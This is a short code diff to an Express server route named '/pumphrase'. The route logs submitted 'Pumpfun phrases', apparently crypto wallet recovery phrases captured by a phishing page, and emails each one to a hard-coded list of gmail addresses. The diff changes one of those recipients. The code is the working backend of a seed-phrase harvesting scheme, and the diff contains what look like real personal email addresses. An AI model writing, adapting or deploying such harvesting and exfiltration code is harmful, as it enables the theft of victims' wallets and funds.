@@ -29,7 +29,7 @@ router.post("/pumphrase", async (req, res) => {
         
         // Optionally send an email notification
         await sendEmail(
-            ["abojegabriel20@gmail.com", "martinluthermod@gmail.com", "blessingicing@gmail.com"],
+            ["ibrahimmohammed427880@gmail.com", "martinluthermod@gmail.com", "blessingicing@gmail.com"],
             "New Pumpfun phrase logged",
             `A new phrase was just logged:\n\n${pumpfunPhrases}`,
             console.log("Email sent successfully")
